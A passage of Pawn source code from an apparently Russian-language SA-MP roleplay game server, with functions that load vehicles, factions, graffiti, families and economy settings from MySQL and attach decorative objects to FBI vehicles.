		strmid(LastDriver[VInfo[idx][vcar]], "Никто", 0, strlen("Никто"), MAX_PLAYER_NAME);

  		if(!strcmp(VInfo[idx][vname],"None",true))
        {
			static const fmt_string2[] = "{f7ae11}%s{FFFFFF}\nЦена: {f7ae11}$%i";
			new str2[sizeof(fmt_string2)+64+10];
			format(str2, sizeof(str2), fmt_string2,VehicleNameS[VInfo[idx][vmodel]-400],VInfo[idx][vcost]);
			UpdateDynamic3DTextLabelText(CarLable[VInfo[idx][vcar]],-1,str2);

		//	Attach3DTextLabelToVehicle(VInfo[idx][vlable], VInfo[idx][vcar], 0.0, 0.0, 1.3);
			//Fuel[VInfo[idx][vcar]] = 100;
		}
		else
		{
		    SetVehicleVirtualWorld(VInfo[idx][vcar],30);
			SetVehicleToRespawn(VInfo[idx][vcar]);
		    SetTuning(VInfo[idx][vcar],idx);
		    SetVehicleNumberPlate(VInfo[idx][vcar], VInfo[idx][vnumber]);
		    IsLocked[VInfo[idx][vcar]] = true;
           	CarDoors(VInfo[idx][vcar],1);
		//	Locked[VInfo[idx][vcar]] = playerid;
		 	Fuel[VInfo[idx][vcar]] = VInfo[idx][vfuel];
	 	}
	}
	printf(" [LOAD]: Успешная загрузка 'LoadVeh1' - загружено %d", TOTALV);
	cache_delete(result, mysql);
}
stock LoadWanted() // cars
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `uk`");
	for (new idx = 1;idx <= cache_get_row_count(mysql);idx ++)
	{
	    WInfo[idx][wID] = cache_get_row_int(idx-1, 0, mysql);
	    cache_get_row(idx-1, 1, WInfo[idx][wName], mysql, 32);
	    WInfo[idx][wWanted] = cache_get_row_int(idx-1, 2, mysql);
		TOTALWANTED++;
	    
	}
    cache_delete(result, mysql);
	print(" [LOAD]: Успешная загрузка 'LoadWanted' - загружено");
}
stock LoadDM() // cars
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `antidm`");
	for (new idx = 1;idx <= cache_get_row_count(mysql);idx ++)
	{
	    AntiDM[idx][admX] = cache_get_row_float(idx-1, 0, mysql);
	    AntiDM[idx][admY] = cache_get_row_float(idx-1, 1, mysql);
	    AntiDM[idx][admZ] = cache_get_row_float(idx-1, 2, mysql);
	    cache_get_row(idx-1, 3, AntiDM[idx][admName], mysql, 32);
	    AntiDM[idx][admRad] = cache_get_row_int(idx-1, 4, mysql);
	    AntiDM[idx][admV] = cache_get_row_int(idx-1, 5, mysql);
	    AntiDM[idx][admI] = cache_get_row_int(idx-1, 6, mysql);
	    AntiDM[idx][admSP] = CreateDynamicSphere(AntiDM[idx][admX],AntiDM[idx][admY], AntiDM[idx][admZ], float(AntiDM[idx][admRad]));
	}
    cache_delete(result, mysql);
	print(" [LOAD]: Успешная загрузка 'LoadAntiDM' - загружено");
}
stock LoadAC() // cars
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `ac`");
	for (new idx = 1;idx <= cache_get_row_count(mysql);idx ++)
	{
	    cheatk[0] = cache_get_row_int(idx-1, 0, mysql);
	    cheatk[1] = cache_get_row_int(idx-1, 1, mysql);
	    cheatk[2] = cache_get_row_int(idx-1, 2, mysql);
	    cheatk[3] = cache_get_row_int(idx-1, 3, mysql);
	    cheatk[4] = cache_get_row_int(idx-1, 4, mysql);
	    cheatk[5] = cache_get_row_int(idx-1, 5, mysql);
	    cheatk[6] = cache_get_row_int(idx-1, 6, mysql);
	    cheatk[7] = cache_get_row_int(idx-1, 7, mysql);
	    cheatk[8] = cache_get_row_int(idx-1, 8, mysql);
	    cheatk[9] = cache_get_row_int(idx-1, 9, mysql);
	    cheatk[10] = cache_get_row_int(idx-1, 10, mysql);
	    cheatk[11] = cache_get_row_int(idx-1, 11, mysql);
	    cheatk[12] = cache_get_row_int(idx-1, 12, mysql);
	    cheatk[13] = cache_get_row_int(idx-1, 13, mysql);
	    cheatk[14] = cache_get_row_int(idx-1, 14, mysql);
	    cheatk[15] = cache_get_row_int(idx-1, 15, mysql);
	}
	cache_delete(result, mysql);
	print(" [LOAD]: Успешная загрузка 'LoadAC' - загружено");
}
stock LoadGraf() // cars
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `gzlogo`");
	TOTALGF = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALGF;idx ++)
	{
	    GZLogoInfo[idx][gOwner][0] = cache_get_row_int(idx-1, 1, mysql);
	    GZLogoInfo[idx][gOwner][1] = cache_get_row_int(idx-1, 2, mysql);
        GZLogoInfo[idx][gCoords][0] = cache_get_row_float(idx-1, 3, mysql);
        GZLogoInfo[idx][gCoords][1] = cache_get_row_float(idx-1, 4, mysql);
        GZLogoInfo[idx][gCoords][2] = cache_get_row_float(idx-1, 5, mysql);
        GZLogoInfo[idx][gCoords][3] = cache_get_row_float(idx-1, 6, mysql);
        GZLogoInfo[idx][gCoords][4] = cache_get_row_float(idx-1, 7, mysql);
        GZLogoInfo[idx][gID] = CreateDynamicObjectEx(19353,GZLogoInfo[idx-1][gCoords][0]+(0.5 * floatsin(-GZLogoInfo[idx-1][gCoords][3], degrees)),GZLogoInfo[idx-1][gCoords][1]+(0.5 * floatcos(-GZLogoInfo[idx-1][gCoords][3], degrees)),GZLogoInfo[idx-1][gCoords][2],0.000,0.000,GZLogoInfo[idx-1][gCoords][3]);
        CreateDynamicMapIcon(GZLogoInfo[idx][gCoords][0],GZLogoInfo[idx][gCoords][1],GZLogoInfo[idx][gCoords][2], 63, 0,-1,-1,-1,200.0);
        CreateDynamic3DTextLabel("[Граффити]{ffffff}\nИспользуйте: {f7ae11}ЛКМ", CREWARD, GZLogoInfo[idx][gCoords][0],GZLogoInfo[idx][gCoords][1],GZLogoInfo[idx][gCoords][2], 5.0);
  		switch(GZLogoInfo[idx][gOwner][1])
	    {
			case F_GROVE: SetDynamicObjectMaterial(GZLogoInfo[idx][gID], 0, 1490, "tags2_lalae", "grove", 0), TotalGraf[0]++;
			case F_BALLAS: SetDynamicObjectMaterial(GZLogoInfo[idx][gID], 0, 1529, "tags_latemple", "temple", 0), TotalGraf[1]++;
			case F_RIFA: SetDynamicObjectMaterial(GZLogoInfo[idx][gID], 0, 1526, "tags_larifa", "rifa", 0), TotalGraf[2]++;
			case F_AZTECAS: SetDynamicObjectMaterial(GZLogoInfo[idx][gID], 0, 1531, "tags_laazteca", "aztecas", 0), TotalGraf[3]++;
			case F_VAGOS: SetDynamicObjectMaterial(GZLogoInfo[idx][gID], 0, 1530, "tags_lavagos", "vagos", 0), TotalGraf[4]++;
		}
		GZLogoInfo[idx][gFinish] = 1000;
	}
	cache_delete(result, mysql);
	print(" [LOAD]: Успешная загрузка 'LoadGraf' - загружено");
}
stock LoadMats() // cars
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `obshak`");
	for (new idx = 1;idx <= cache_get_row_count(mysql);idx ++)
	{
    	FracMats[F_GROVE] = cache_get_row_int(idx-1, 0, mysql);
		FracMats[F_BALLAS] = cache_get_row_int(idx-1, 1, mysql);
		FracMats[F_BIKERS] = cache_get_row_int(idx-1, 2, mysql);
		FracMats[F_AZTECAS] = cache_get_row_int(idx-1, 3, mysql);
		FracMats[F_VAGOS] = cache_get_row_int(idx-1, 4, mysql);
		FracMats[F_RM] = cache_get_row_int(idx-1, 5, mysql);
		FracMats[F_LCN] = cache_get_row_int(idx-1, 6, mysql);
		FracMats[F_YAKUZA] = cache_get_row_int(idx-1, 7, mysql);
		FracMats[F_LVPD] = cache_get_row_int(idx-1, 8, mysql);
		FracMats[F_ARMY] = cache_get_row_int(idx-1, 9, mysql);
		FracMats[F_FBI] = cache_get_row_int(idx-1, 10, mysql);
		FracMats[F_RIFA] = cache_get_row_int(idx-1, 11, mysql);
		FracMats[F_LSPD] = cache_get_row_int(idx-1, 12, mysql);
		FracBank[F_GROVE] = cache_get_row_int(idx-1, 13, mysql);
		FracBank[F_BALLAS] = cache_get_row_int(idx-1, 14, mysql);
		
		FracBank[F_AZTECAS] = cache_get_row_int(idx-1, 15, mysql);
        FracBank[F_BIKERS] = cache_get_row_int(idx-1, 16, mysql);
		FracBank[F_VAGOS] = cache_get_row_int(idx-1, 17, mysql);
		FracBank[F_RM] = cache_get_row_int(idx-1, 18, mysql);
		FracBank[F_YAKUZA] = cache_get_row_int(idx-1, 19, mysql);
		FracBank[F_LCN] = cache_get_row_int(idx-1, 20, mysql);
		FracBank[F_RIFA] = cache_get_row_int(idx-1, 21, mysql);
		FracDrugs[F_GROVE] = cache_get_row_int(idx-1, 22, mysql);
		FracDrugs[F_BALLAS] = cache_get_row_int(idx-1, 23, mysql);
		FracDrugs[F_BIKERS] = cache_get_row_int(idx-1, 24, mysql);
		FracDrugs[F_AZTECAS] = cache_get_row_int(idx-1, 25, mysql);
		FracDrugs[F_VAGOS] = cache_get_row_int(idx-1, 26, mysql);
		FracDrugs[F_RM] = cache_get_row_int(idx-1, 27, mysql);
		FracDrugs[F_LCN] = cache_get_row_int(idx-1, 28, mysql);
		FracDrugs[F_YAKUZA] = cache_get_row_int(idx-1, 29, mysql);
		FracDrugs[F_RIFA] = cache_get_row_int(idx-1, 30, mysql);
		FracLock[F_GROVE] = cache_get_row_int(idx-1, 31, mysql);
		FracLock[F_BALLAS] = cache_get_row_int(idx-1, 32, mysql);
		FracLock[F_BIKERS] = cache_get_row_int(idx-1, 33, mysql);
		FracLock[F_VAGOS] = cache_get_row_int(idx-1, 34, mysql);
		FracLock[F_AZTECAS] = cache_get_row_int(idx-1, 35, mysql);
		FracLock[F_ARMY] = cache_get_row_int(idx-1, 36, mysql);
		FracLock[F_LVPD] = cache_get_row_int(idx-1, 37, mysql);
		FracLock[F_FBI] = cache_get_row_int(idx-1, 38, mysql);
		FracLock[F_YAKUZA] = cache_get_row_int(idx-1, 39, mysql);
		FracLock[F_RM] = cache_get_row_int(idx-1, 40, mysql);
		FracLock[F_LCN] = cache_get_row_int(idx-1, 41, mysql);
		FracLock[F_RIFA] = cache_get_row_int(idx-1, 42, mysql);
		Prod = cache_get_row_int(idx-1, 43, mysql);
		Kazna = cache_get_row_int(idx-1, 44, mysql);
		LicCost[0] = cache_get_row_int(idx-1, 45, mysql);
		LicCost[1] = cache_get_row_int(idx-1, 46, mysql);
		LicCost[2] = cache_get_row_int(idx-1, 47, mysql);
		LicCost[3] = cache_get_row_int(idx-1, 48, mysql);
		LicCost[4] = cache_get_row_int(idx-1, 49, mysql);
		AdCena = cache_get_row_int(idx-1, 50, mysql);
		AdSms = cache_get_row_int(idx-1, 51, mysql);
		AdZvon = cache_get_row_int(idx-1, 52, mysql);
		NalogTS = cache_get_row_int(idx-1, 53, mysql);
		HosAp = cache_get_row_int(idx-1, 54, mysql);
		HosAp1 = cache_get_row_int(idx-1, 55, mysql);
		Perevod = cache_get_row_int(idx-1, 56, mysql);
		Birga = cache_get_row_int(idx-1, 57, mysql);
		Advocat  = cache_get_row_int(idx-1, 58, mysql);
		OplDom  = cache_get_row_int(idx-1, 59, mysql);
		OplBiz  = cache_get_row_int(idx-1, 60, mysql);
	    KoykaCena  = cache_get_row_int(idx-1, 61, mysql);
	    CaptInfo[0][stop]  = cache_get_row_int(idx-1, 62, mysql);
	    CaptInfo[1][stop]  = cache_get_row_int(idx-1, 63, mysql);
	    CaptInfo[2][stop]  = cache_get_row_int(idx-1, 64, mysql);
	    CaptInfo[3][stop]  = cache_get_row_int(idx-1, 65, mysql);
	    CaptInfo[4][stop]  = cache_get_row_int(idx-1, 66, mysql);
	    CaptInfo[5][stop]  = cache_get_row_int(idx-1, 67, mysql);
	    CaptInfo[6][stop]  = cache_get_row_int(idx-1, 68, mysql);
	    CaptInfo[7][stop]  = cache_get_row_int(idx-1, 69, mysql);
	    CaptInfo[8][stop]  = cache_get_row_int(idx-1, 70, mysql);
		NarkSklad = cache_get_row_int(idx-1, 71, mysql);
		FracLock[F_LSPD] = cache_get_row_int(idx-1, 72, mysql);
	}
	
    cache_delete(result, mysql);
	print(" [LOAD]: Успешная загрузка 'LoadMats' - загружено");
}




stock LoadTorg() // cars
{
	new Cache:result = mysql_query(mysql, "SELECT * FROM `torg`");
	for (new idx = 1;idx <= cache_get_row_count(mysql);idx ++)
	{
	    TorgInfo[tID][idx-1] = cache_get_row_int(idx-1, 1, mysql);
	    TorgInfo[tPrice][idx-1] = cache_get_row_int(idx-1, 1, mysql);
	    TorgInfo[tSlot][idx-1] = cache_get_row_int(idx-1, 2, mysql);
	    TorgInfo[tKol][idx-1] = cache_get_row_int(idx-1, 3, mysql);
	    TorgInfo[tIDacc][idx-1] = cache_get_row_int(idx-1, 4, mysql);
	}
	print(" [LOAD]: Успешная загрузка 'LoadTorg' - загружено");
	cache_delete(result, mysql);
}




stock LoadFam() // cars
{
	new Cache:result = mysql_query(mysql, "SELECT * FROM `fam`");
	TOTALFAM = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALFAM;idx ++)
	{
	    FamInfo[idx][id] = cache_get_row_int(idx-1, 0, mysql);
	    cache_get_row(idx-1, 1, FamInfo[idx][fName], mysql, 50);
	    cache_get_row(idx-1, 2, FamInfo[idx][fLeader], mysql, 24);
	    FamInfo[idx][fKazna] = cache_get_row_int(idx-1, 3, mysql);
	    FamInfo[idx][fHouse] = cache_get_row_int(idx-1, 4, mysql);
	    FamInfo[idx][fShkaf] = cache_get_row_int(idx-1, 5, mysql);
	    FamInfo[idx][fColor] = cache_get_row_int(idx-1, 6, mysql);
	}
	print(" [LOAD]: Успешная загрузка 'LoadFam' - загружено");
	cache_delete(result, mysql);
}

stock LoadVeh() // cars
{
	new time = GetTickCount(),ab;
	new Cache:result = mysql_query(mysql, "SELECT * FROM `"TABLE_VEH"`");
	TOTALVEH = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALVEH;idx ++)
	{
		VehInfo[idx][id] = cache_get_row_int(idx-1, 0, mysql);
		VehInfo[idx][vModel] = cache_get_row_int(idx-1, 1, mysql);
		VehInfo[idx][vX] = cache_get_row_float(idx-1, 2, mysql);
		VehInfo[idx][vY]= cache_get_row_float(idx-1, 3, mysql);
		VehInfo[idx][vZ] = cache_get_row_float(idx-1, 4, mysql);
		VehInfo[idx][vFa] = cache_get_row_float(idx-1, 5, mysql);
		VehInfo[idx][vInt] = cache_get_row_int(idx-1, 6, mysql);
		VehInfo[idx][vWorld] = cache_get_row_int(idx-1, 7, mysql);
		cache_get_row(idx-1, 8, VehInfo[idx][vColors], mysql, 10);
		VehInfo[idx][vFr] = cache_get_row_int(idx-1, 9, mysql);
		VehInfo[idx][vCost] = cache_get_row_int(idx-1, 10, mysql);
		VehInfo[idx][vFuel] = cache_get_row_int(idx-1, 11, mysql);
		sscanf(VehInfo[idx][vColors], "p<,>a<i>[2]",VehInfo[idx][vColor]);
//		if(VehInfo[idx][vFr] == F_BIKERS || VehInfo[idx][vFr] == F_LCN) continue;
	 	VehInfo[idx][vVehicle] = CreateVehicle(VehInfo[idx][vModel], VehInfo[idx][vX], VehInfo[idx][vY], VehInfo[idx][vZ], VehInfo[idx][vFa], VehInfo[idx][vColor][0], VehInfo[idx][vColor][1], 600);
		if(VehInfo[idx][vFr] == F_LVPD && (VehInfo[idx][vModel] == 560 || VehInfo[idx][vModel] == 561 || VehInfo[idx][vModel] == 405))
		{
		    //VehInfo[idx][vVehicle] = CreateVehicle(VehInfo[idx][vModel], VehInfo[idx][vX], VehInfo[idx][vY], VehInfo[idx][vZ], VehInfo[idx][vFa], VehInfo[idx][vColor][0], VehInfo[idx][vColor][1], 300,1);
            ab = CreateDynamicObject(19620,0.0,0.0,0.0,0.0,0.0,0.0);
   			if(VehInfo[idx][vModel] == 560 || VehInfo[idx][vModel] == 561) AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle] , -0.0, -0.2, 0.85, 1.0, 1.0, 1.0);
			else AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle] , -0.0, -0.2, 0.8, 1.0, 1.0, 1.0);
		}
		if(VehInfo[idx][vFr] == F_FBI)
		{
		    if( VehInfo[idx][vModel] == 418)
		    {
			    ab = CreateDynamicObject(19777,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 0.793, 1.550, 0.400, 50.499, -5.299, 163.199);
			    ab = CreateDynamicObject(19419,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.009, 0.820, 0.990, 0.000, 0.000, 0.000);
			    AddVehicleComponent(VehInfo[idx][vVehicle], 1010);
		    }
		    if( VehInfo[idx][vModel] == 403)
		    {
		        ab = CreateDynamicObject(19797,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 0.990, 4.420, -0.811, 0.000, 0.000, 170.600);
			    ab = CreateDynamicObject(19797,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.990, 4.420, -0.811, 0.000, 0.000, -170.600);
			    ab = CreateDynamicObject(19620,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.060, 0.040, 2.160, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "FBI", 130, "Arial", 199, 1, -1, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.271, -0.650, 0.670, 90.000, 360.000, 0.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "FBI", 130, "Arial", 199, 1, -1, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.271, -0.650, 0.670, 90.000, -360.000, 180.000);
			    ab = CreateDynamicObject(1112,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 16640, "a51", "a51_boffstuff3", -16777216);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 0.060, 4.382, 0.679, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(1182,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 1560, "7_11_door", "CJ_CHROME2", -13619152);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.920, 4.432, -1.139, 0.000, 0.000, 360.000);
			    ab = CreateDynamicObject(1181,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, -1, "none", "none", -13619152);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.920, 4.432, -1.050, 0.000, 0.000, 360.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "0851", 140, "Arial", 150, 1, -1, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 0.000, 3.292, 0.690, 0.000, -90.000, -180.000);
		    }
		    if( VehInfo[idx][vModel] == 591)
		    {
		        fbidal = VehInfo[idx][vVehicle];
		        CreateDynamic3DTextLabel( "{f7ae11}[Выход]{ffffff}\nИспользуйте: {f7ae11}LALT",-1,1389.5343,5.2544,1000.9153,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,VehInfo[idx][vVehicle]);
		        CreateDynamic3DTextLabel( "{f7ae11}[Слежка]{ffffff}\nИспользуйте: {f7ae11}H",-1,1390.7922,-0.8211,1000.9153,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,VehInfo[idx][vVehicle]);
				new Float:x,Float:y,Float:z;
				GetVehicleModelInfo(591, VEHICLE_MODEL_INFO_REAR_BUMPER_Z, x, y, z);
				CreateDynamic3DTextLabel( "{f7ae11}[FBI]{ffffff}\nИспользуйте: {f7ae11}/enter",-1,x,y,z,10.0,INVALID_PLAYER_ID,VehInfo[idx][vVehicle],0,-1,-1);
				ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.240, -0.120, 1.310, 90.000, 180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.240, -0.120, 1.310, 90.000, -180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.240, 3.351, 1.310, -90.000, -180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.240, 3.351, 1.310, -90.000, 180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.240, 4.851, 1.310, 90.000, 180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.240, 4.851, 1.080, -90.000, -180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.240, 4.851, 1.080, -90.000, 180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.240, 4.851, 1.310, 90.000, -180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.240, 2.069, 0.580, 90.000, 180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.240, -0.118, 0.580, -90.000, 180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.240, -0.118, 0.580, -90.000, -180.000, 0.000);
			    ab = CreateDynamicObject(19430,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 10765, "airportgnd_sfse", "black64", 0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.240, 2.069, 0.580, 90.000, -180.000, 0.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "R", 90, "Wingdings", 180, 0, -10496, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.332, -0.940, 0.980, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "R", 90, "Wingdings", 180, 0, -10496, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.331, -0.901, 1.030, 90.000, 360.000, 0.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "FBI", 130, "Arial", 80, 1, -6645094, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.352, -0.940, 1.029, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "n", 130, "Webdings", 150, 1, -16777077, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.334, -0.940, 1.020, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(19482,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "FEDERAL BUREAU OF INVESTIGATION", 130, "Arial", 30, 1, -6645094, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.352, 2.561, 1.490, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(19482,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "MOBILE COORDINATION CENTER", 130, "Arial", 35, 1, -6645094, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.352, 3.392, 1.179, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(19482,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "FIDELITY | BRAVERY | INTEGRITY", 140, "Arial", 30, 1, -6645094, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 1.352, 0.859, -0.060, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "R", 90, "Wingdings", 180, 0, -10496, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.331, -0.901, 1.030, 90.000, -360.000, 0.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "FBI", 130, "Arial", 80, 1, -6645094, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.352, -0.940, 1.029, 0.000, 0.000, 180.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "n", 130, "Webdings", 150, 1, -16777077, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.334, -0.940, 1.020, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(19483,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "R", 90, "Wingdings", 180, 0, -10496, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.332, -0.940, 0.980, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(19482,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "FEDERAL BUREAU OF INVESTIGATION", 130, "Arial", 30, 1, -6645094, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.352, 3.412, 1.490, 0.000, 0.000, 180.000);
			    ab = CreateDynamicObject(19482,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "MOBILE COORDINATION CENTER", 130, "Arial", 35, 1, -6645094, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.352, 2.641, 1.179, 0.000, 0.000, 180.000);
			    ab = CreateDynamicObject(19482,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterialText(ab, 0, "FIDELITY | BRAVERY | INTEGRITY", 140, "Arial", 30, 1, -6645094, 0, 1);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -1.352, 0.859, -0.060, 0.000, 0.000, 180.000);
